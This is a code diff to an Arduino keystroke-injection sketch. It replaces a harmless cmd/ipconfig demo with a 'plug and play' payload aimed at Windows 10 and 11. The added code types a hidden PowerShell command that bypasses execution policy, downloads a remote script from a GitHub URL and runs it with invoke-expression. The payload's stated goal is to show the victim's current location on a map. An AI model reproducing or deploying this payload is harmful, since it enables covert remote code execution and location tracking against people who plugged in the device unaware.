@@ -20,30 +20,22 @@ void setup()
   // Wait 500ms
   delay(500);
 
-  // Open cmd
-  delay(2000);
-
+  //     Title: Rage-PopUps
+  //     Author: I am reza
+  //     Description: This payload is meant to open a map in your targets web browser with their current location
+  //     Target: Windows 10, 11
+  //     --------------------------------------------------------------------------------------
+  //     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+  //     --------------------------------------------------------------------------------------
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
 
-  delay(2000);
-
-  Keyboard.print("cmd");
-
   delay(500);
 
-  typeKey(KEY_RETURN);
-
-  delay(500);
-
-  Keyboard.print("ipconfig");
+  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl");
 
   typeKey(KEY_RETURN);
-
-  delay(1000);
-
-  Keyboard.print("Hi ... IM SECBAZ!");
 
   // Ending stream
   Keyboard.end();
